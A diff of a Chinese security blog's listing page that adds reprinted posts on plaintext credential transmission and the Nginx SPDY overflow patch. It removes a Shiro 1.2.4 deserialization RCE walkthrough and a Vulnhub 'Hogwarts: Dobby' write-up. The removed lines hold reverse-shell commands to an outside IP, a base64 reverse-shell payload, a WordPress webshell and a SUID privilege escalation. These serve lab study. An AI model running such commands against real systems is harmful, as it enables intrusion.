@@ -14,7 +14,7 @@
     <meta name="description" content="Open your eyes to see the light in life">
 <meta property="og:type" content="website">
 <meta property="og:title" content="氕氘氚">
-<meta property="og:url" content="http://example.com/categories/Technology/page/10/index.html">
+<meta property="og:url" content="https://szczecin.github.io/categories/Technology/page/10/index.html">
 <meta property="og:site_name" content="氕氘氚">
 <meta property="og:description" content="Open your eyes to see the light in life">
 <meta property="og:locale">
@@ -81,6 +81,99 @@
 
 
 <section class="post-list">
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/15/Plaintext-Transmisson/">
+                Plaintext Transmission
+            </a>
+        </h2>
+    
+    <time>
+        Aug 15, 2022
+    </time>
+    <section class="content">
+        <h1><span id="用户凭据明文传输">用户凭据明文传输</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36292543/article/details/121743138">天泽岁月</a></p>
+</blockquote>
+<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
+<p>用户凭据通过未加密的通道传输。当我们在网站上面提交敏感数据到服务器的过程中未进行相关加密处理，导致攻击者通过中间人攻击方式（劫持、嗅探等）【如果加密方式是常见的加密也可以解密的（比如：MD5，RSA 等–另外base64只是一种编码方式并不算是加密！】即可获取到这些未加密的敏感数据。所有经过网关的流量都可以被黑客通过嗅探（ARP欺骗）的方式抓取到。</p>
+<p>当攻击者获取到这些数据之后，就可以用这些信息以合法用户的身份进入到应用系统中——甚至可能进入到应用系统后台中，一旦进入到应用系统中那么就可以获取更多的敏感数据，以及更有机会发现更多的漏洞。</p>
+</blockquote>
+<h2><span id="漏洞验证">漏洞验证</span></h2><blockquote>
+<p>找到网站或者web系统登录页面。</p>
+<p>通过过对网站登录页面的请求进行抓包，分析其数据包中相关password（密码）参数的值是否为明文。</p>
+<p>工具可用burp、wireshark、filder等等，抓包分析的密码</p>
+<p>浏览器的F12中的“网络”模块功能并点击HTML进行筛选，点击登录即可获取到post或者get的请求头及请求主体的内容，如下图所示，就获取到了http明文登录的敏感数据了。</p>
+<p><img src="/2022/08/15/Plaintext-Transmisson/1.png" alt="image"></p>
+</blockquote>
+<h2><span id="修复建议">修复建议</span></h2><blockquote>
+<p>由于用户凭据为敏感信息，应始终通过加密通道 (HTTPS) 传输，以避免被恶意用户拦截。因此应始终通过加密连接 (HTTPS) 将其传输到服务器。</p>
+<p>如果不用 HTTPS，可以在网站前端用 Javascript 做密码加密，加密后再进行传输。(js被禁用了就GG)</p>
+<p>使用正规的ca机构颁发的https证书</p>
+<p>采用非对称加密方式（不可逆的加密方式）</p>
+</blockquote>
+<h2><span id="参考学习">参考学习</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39934520/article/details/107441540">浅谈“密码明文传输”</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/xieweikun_7/article/details/105869954">渗透测试（二）：敏感信息明文传输</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Plaintext/" rel="tag">Plaintext</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/15/CVE-2014-0133-Nginx/">
+                CVE-2014-0133-Nginx
+            </a>
+        </h2>
+    
+    <time>
+        Aug 15, 2022
+    </time>
+    <section class="content">
+        <h1><span id="nginx-spdy缓冲区溢出漏洞">Nginx SPDY缓冲区溢出漏洞</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_53008479/article/details/124755846">山兔1</a> 并作补充</p>
+</blockquote>
+<h2><span id="注意">注意</span></h2><blockquote>
+<p>nginx SPDY实现存在基于堆的缓冲区溢出，允许攻击者利用漏洞提交特殊的请求使应用程序崩溃或执行任意代码。</p>
+<p>如果是漏扫，扫出来的话，是没有用的，它是根据版本来确认nginx是否存在的漏洞的，具体得登陆服务器上看。</p>
+</blockquote>
+<h2><span id="成因">成因</span></h2><blockquote>
+<p>Nginx 1.3.15 - 1.5.11 的版本都收此漏洞影响，原因是如果<code>listen</code>指令中的<code>spdy</code>选项被配置文件所调用，则编译时会使用<code>ngx_http_spdy_module</code>模块（默认不编译），并且没有<code>--with-debug</code>配置选项。</p>
+</blockquote>
+<h2><span id="修复">修复</span></h2><blockquote>
+<p>此漏洞已在 Nginx 1.5.12 及 1.4.7 后被修复，问题补丁如下：</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--- src/http/ngx_http_spdy.c</span><br><span class="line">+++ src/http/ngx_http_spdy.c</span><br><span class="line">@@ -1849,7 +1849,7 @@ static u_char *</span><br><span class="line"> ngx_http_spdy_state_save(ngx_http_spdy_connection_t *sc,</span><br><span class="line">     u_char *pos, u_char *end, ngx_http_spdy_handler_pt handler)</span><br><span class="line"> &#123;</span><br><span class="line">-#if (NGX_DEBUG)</span><br><span class="line">+#if 1</span><br><span class="line">     if (end - pos &gt; NGX_SPDY_STATE_BUFFER_SIZE) &#123;</span><br><span class="line">         ngx_log_error(NGX_LOG_ALERT, sc-&gt;connection-&gt;log, 0,</span><br><span class="line">                       &quot;spdy state buffer overflow: &quot;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>请更新 <a target="_blank" rel="noopener" href="https://nginx.org/en/download.html">Nginx 版本</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nginx/" rel="tag">Nginx</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
   
     <article class="post ">
 
@@ -1249,9 +1342,7 @@
 
 <blockquote>
 <p>IDOR - 自动测试方式：<br><a target="_blank" rel="noopener" href="https://threat.tevora.com/finding-broken-access-controls/">Finding Broken Access Controls</a><br><a target="_blank" rel="noopener" href="https://blog.yeswehack.com/yeswerhackers/pimpmyburp-pwnfox-autorize-find-idor/">PimpMyBurp #1 - PwnFox + Autorize: The perfect combo to find IDOR - Global Bug Bounty Platform</a><br><a target="_blank" rel="noopener" href="https://medium.com/cyberverse/automating-burp-to-find-idors-2b3dbe9fa0b8">Automating BURP to find IDORs</a></p>
-<ul>
-<li>参考<br><a target="_blank" rel="noopener" href="https://medium.com/@aysebilgegunduz/everything-you-need-to-know-about-idor-insecure-direct-object-references-375f83e03a87">Everything You Need to Know About IDOR (Insecure Direct Object References)</a><br><a target="_blank" rel="noopener" href="https://www.aon.com/cyber-solutions/aon_cyber_labs/finding-more-idors-tips-and-tricks/">Finding more IDORs - Tips and Tricks | Aon</a><br><a target="_blank" rel="noopener" href="https://github.com/KathanP19/HowToHunt/blob/master/IDOR/IDOR-Old.md">KathanP19&#x2F;HowToHunt</a><br><a target="_blank" rel="noopener" href="https://www.bugbountyhunter.com/vulnerability/?type=idor">Learn about Insecure Object Reference (IDOR) | BugBountyHunter.com</a><br><a target="_blank" rel="noopener" href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References.html">WSTG - v4.2</a><br><a target="_blank" rel="noopener" href="https://notes.mufaddal.info/web/idor">IDOR (Insecure Direct Object Reference)</a><br><a target="_blank" rel="noopener" href="https://medium.com/@Sm9l/what-i-learnt-from-reading-220-idor-bug-reports-6efbea44db7">What I learnt from reading 220* IDOR bug reports.</a></li>
-</ul>
+<p>参考<br><a target="_blank" rel="noopener" href="https://medium.com/@aysebilgegunduz/everything-you-need-to-know-about-idor-insecure-direct-object-references-375f83e03a87">Everything You Need to Know About IDOR (Insecure Direct Object References)</a><br><a target="_blank" rel="noopener" href="https://www.aon.com/cyber-solutions/aon_cyber_labs/finding-more-idors-tips-and-tricks/">Finding more IDORs - Tips and Tricks | Aon</a><br><a target="_blank" rel="noopener" href="https://github.com/KathanP19/HowToHunt/blob/master/IDOR/IDOR-Old.md">KathanP19&#x2F;HowToHunt</a><br><a target="_blank" rel="noopener" href="https://www.bugbountyhunter.com/vulnerability/?type=idor">Learn about Insecure Object Reference (IDOR) | BugBountyHunter.com</a><br><a target="_blank" rel="noopener" href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References.html">WSTG - v4.2</a><br><a target="_blank" rel="noopener" href="https://notes.mufaddal.info/web/idor">IDOR (Insecure Direct Object Reference)</a><br><a target="_blank" rel="noopener" href="https://medium.com/@Sm9l/what-i-learnt-from-reading-220-idor-bug-reports-6efbea44db7">What I learnt from reading 220* IDOR bug reports.</a></p>
 <p>Medium 报告：<br><a target="_blank" rel="noopener" href="https://mokhansec.medium.com/full-account-takeover-worth-1000-think-out-of-the-box-808f0bdd8ac7">Full account takeover worth $1000 Think out of the box</a><br><a target="_blank" rel="noopener" href="https://infosecwriteups.com/all-about-getting-first-bounty-with-idor-849db2828c8">All About Getting First Bounty with IDOR</a><br><a target="_blank" rel="noopener" href="https://vedanttekale20.medium.com/idor-that-allowed-me-to-takeover-any-users-account-129e55871d8">IDOR that allowed me to takeover any users account.</a><br><a target="_blank" rel="noopener" href="https://betterprogramming.pub/all-about-idor-attacks-64c4203b518e">All About IDOR Attacks</a><br><a target="_blank" rel="noopener" href="https://amineaboud.medium.com/access-developer-tasks-list-of-any-of-facebook-application-graphql-idor-62307c5e5b34">Access developer tasks list of any of Facebook Application (GraphQL IDOR)</a></p>
 <p>Tips</p>
 </blockquote>
@@ -1613,218 +1704,6 @@
     </section>
 </article>
   
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/08/Shiro-RememberMe-1-2-4/">
-                Shiro RememberMe 1.2.4
-            </a>
-        </h2>
-    
-    <time>
-        Aug 8, 2022
-    </time>
-    <section class="content">
-        <h1><span id="shiro-rememberme-124-反序列化命令执行漏洞复现-kali-docker">Shiro RememberMe 1.2.4 反序列化命令执行漏洞复现 kali docker</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44067239/article/details/106918315">莫憨憨</a></p>
-</blockquote>
-<h3><span id="影响版本apache-shiro-ltx3d-124">影响版本：Apache Shiro &lt;&#x3D; 1.2.4</span></h3><h2><span id="漏洞产生原因">漏洞产生原因:</span></h2><blockquote>
-<p>shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化。<br>然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。使用大佬脚本生成 payload(ysoserial.jar文件和运行目录处于同一目录)</p>
-</blockquote>
-<h2><span id="漏洞环境搭建">漏洞环境搭建</span></h2><h3><span id="1拉取镜像">1.拉取镜像</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>
-
-<h3><span id="2启动环境">2.启动环境</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:8080 -p 7777:6666 medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>如需进入环境，命令为</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it name /bin/bash</span><br></pre></td></tr></table></figure>
-
-<h3><span id="3web访问">3.web访问</span></h3><blockquote>
-<p><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a> 能看到如下页面即可</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/1.png" alt="image"></p>
-<p>或虚拟机外面用真实ip访问</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/2.png" alt="image"></p>
-<p>至此漏洞环境搭建成功</p>
-</blockquote>
-<h2><span id="漏洞复现">漏洞复现</span></h2><h3><span id="1抓包测试">1.抓包测试</span></h3><blockquote>
-<p>查看返回包里setcookie有rememberme的字样</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/3.png" alt="image"></p>
-</blockquote>
-<h3><span id="2继续测试">2.继续测试</span></h3><blockquote>
-<p>首先最简单的测试方法是用dnslog，看看是否有回显。<br>利用POC生成想要执行的命令对应的rememberMe</p>
-</blockquote>
-<h3><span id="3工具准备">3.工具准备</span></h3><blockquote>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/4.png" alt="image"></p>
-<p>生成payload的脚本使用的是python3,运行报错就安装一下模块</p>
-</blockquote>
-<h3><span id="4生成payload">4.生成payload：</span></h3><blockquote>
-<p>双引号中是想要执行的命令，如果这里没有公网VPS，就用dnslog来证明。攻击原理一样，不认可的杠精可直接怼</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 shiro_1.2.4.py <span class="string">&quot;ping 39p2wo.dnslog.cn&quot;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>运行结果如下图：</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/5.png" alt="image"></p>
-<p>然后便会在脚本所在目录下生成文件payload.cookie</p>
-</blockquote>
-<h3><span id="5回到浏览器抓包">5.回到浏览器抓包</span></h3><blockquote>
-<p>用payload.cookie中的rememberMe内容加入Cookie中，或者直接放进参数中，提交看页面回显和dnslog页面是否有数据过去</p>
-</blockquote>
-<h3><span id="6到ceye平台查看日志记录">6.到ceye平台查看日志记录</span></h3><blockquote>
-<p>dnslog日志刷新后有记录了，说明payloda执行成功</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/6.png" alt="image"></p>
-</blockquote>
-<h2><span id="反弹shell">反弹shell</span></h2><blockquote>
-<p>当然了，有VPS的情况下，为何不反弹一下shell呢？</p>
-</blockquote>
-<h3><span id="1使用脚本生成key">1.使用脚本生成key</span></h3><blockquote>
-<p>反弹shell的命令：<code>bash -i &gt;&amp; /dev/tcp/22.45.13.9/7878 0&gt;&amp;1</code></p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 shiro_1.2.4.py <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/22.45.13.9/7878 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>PS：ip假的，不打码，观看流畅</p>
-</blockquote>
-<h3><span id="2先公网vps监听反弹shell的命令">2.先公网VPS监听反弹shell的命令</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7878</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/7.png" alt="image"></p>
-</blockquote>
-<h3><span id="3加入payload提交数据包">3.加入payload，提交数据包</span></h3><blockquote>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/8.png" alt="image"></p>
-<p>这里使用curl也能达到burp的效果</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 加 -I 是只看响应头，这里主要关注set-cookie:rememberMe</span><br><span class="line">curl -X GET http://172.16.12.132 --cookie “xxxxxxxxxxxxx” -I</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>讲这个是因为此方法可以用来初步探测shiro信息</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/9.png" alt="image"></p>
-</blockquote>
-<h3><span id="4vps收到了反弹回来的shell">4.vps收到了反弹回来的shell</span></h3><blockquote>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/10.png" alt="image"></p>
-</blockquote>
-<h2><span id="题外话1">题外话1</span></h2><blockquote>
-<p>研究这个漏洞，是因为客户要求排查下资产，然后找不到集成的工具和一键式检查的。<br>漏洞的事情OK了，还是觉得自己太菜，要是代码够给力，写个集成的丢github上就真的香。</p>
-</blockquote>
-<h2><span id="题外话2">题外话2</span></h2><blockquote>
-<p>还有一个思路，看大佬文章时，这里一直没搞懂。字面意思是用ysoserial中的JRMP监听模块来搞定的，后续学会了再补上笔记</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 3888 CommonsCollections5 <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/11.png" alt="image"></p>
-</blockquote>
-<h2><span id="参考链接">参考链接：</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0007eafd1f92">https://www.jianshu.com/p/0007eafd1f92</a><br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/112742.html">https://www.secpulse.com/archives/112742.html</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/08/Hogwarts-Dobby/">
-                Hogwarts Dobby
-            </a>
-        </h2>
-    
-    <time>
-        Aug 8, 2022
-    </time>
-    <section class="content">
-        <h1><span id="hogwarts-dobby">HOGWARTS: DOBBY</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称hogwarts-dobby">名称：Hogwarts: Dobby</span></h4><h4><span id="发布日期2020118">发布日期：2020.11.8</span></h4><h4><span id="作者bly">作者：BLY</span></h4><h4><span id="系列hogwarts">系列：Hogwarts</span></h4><h4><span id="推特bertrandlorent9">推特：@BertrandLorent9</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;proof.txt </p>
-<h4><span id="难度简单">难度：简单</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名dobbyova">文件名：dobby.ova</span></h4><h4><span id="文件大小37gb">文件大小：3.7GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagehogwartsdobbyova">下载地址：</span></h4><h4><span id="md5-11b9fd40b70344a71b432a608ee640ab">MD5: 11B9FD40B70344A71B432A608EE640AB</span></h4><h4><span id="sha1-68110b92fd58d6a4c8f0cdbe169e29259ac797a6">SHA1: 68110B92FD58D6A4C8F0CDBE169E29259AC797A6</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机dobby和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/08/08/Hogwarts-Dobby/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Dobby/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Dobby/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现只开放了80端口，访问主页，还是apache的默认页，但源码有路径提示：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.126 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Dobby/4.png" alt="image-"></p>
-<p><img src="/2022/08/08/Hogwarts-Dobby/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，&#x2F;log目录值得关注一下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.126 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Dobby/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="网页发现">网页发现</span></h3><blockquote>
-<p>1.访问&#x2F;alohomora目录，发现Draco用户的密码提示：</p>
-<p><img src="/2022/08/08/Hogwarts-Dobby/7.png" alt="image-"></p>
-<p>2.访问&#x2F;log目录，发现直接提示了一个密码和路径：</p>
-<p><img src="/2022/08/08/Hogwarts-Dobby/8.png" alt="image-"></p>
-<p>3.继续访问&#x2F;DiagonAlley，发现一串brainfuck编码，且这个页面是用wordpress搭建的：</p>
-<p><img src="/2022/08/08/Hogwarts-Dobby/9.png" alt="image-"></p>
-<p>4.将brainfuck字串解码，但解出来是乱码：</p>
-<p><img src="/2022/08/08/Hogwarts-Dobby/10.png" alt="image-"></p>
-</blockquote>
-<h3><span id="wordpress后台登录写入shell">Wordpress后台登录，写入shell</span></h3><blockquote>
-<p>1.再从wordpress入手，用wpscan进行扫描，但没有过多问题：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.56.126/DiagonAlley --detection-mode aggressive</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Dobby/11.png" alt="image-"></p>
-<p>2.进入wp-login.php后台页，我们有用户draco，而提示他的马的名字slytherin就是密码：</p>
-<p><img src="/2022/08/08/Hogwarts-Dobby/12.png" alt="image-"></p>
-<p>3.进入wordpress后台后，对kali自带的webshell，&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php进行ip及端口修改，在Apariencia-Editor de temas-Error 404页写入：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/share/webshells/php/php-reverse-shell.php</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Dobby/13.png" alt="image-"></p>
-<p><img src="/2022/08/08/Hogwarts-Dobby/14.png" alt="image-"></p>
-<p>4.在kali开启对应端口监听，访问&#x2F;DiagonAlley目录下不存在页即可触发shell，再利用python构建交互式shell：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9001</span><br><span class="line"></span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Dobby/15.png" alt="image-"></p>
-<p><img src="/2022/08/08/Hogwarts-Dobby/16.png" alt="image-"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.查找有suid的文件，发现find：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null | grep usr/bin</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Dobby/17.png" alt="image-"></p>
-<p>2.利用find可以直接提权到root：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -exec /bin/sh -p \; -quit</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Dobby/18.png" alt="image-"></p>
-</blockquote>
-<h3><span id="flag获取">Flag获取</span></h3><blockquote>
-<p>1.现在我们在&#x2F;root目录下能够发现flag，即proof.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">vi proof.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/08/Hogwarts-Dobby/19.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Hogwarts/" rel="tag">Hogwarts</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
 </section>
 
 
@@ -1853,7 +1732,7 @@
     <div class="social-wrapper">
         
             
-                <a href="https://github.com/artchen" class="social github"
+                <a href="https://github.com/szczecin" class="social github"
                    target="_blank" rel="external">
                     <span class="icon icon-github"></span>
                 </a>
@@ -1972,7 +1851,7 @@
                     </li>
                 
                     <li class="left">
-                        <a href="/SRC"
+                        <a href="/tags/SRC"
                            onfocus="this.blur();"
                            class="nav-SRC dark-btn block">
                             SRC
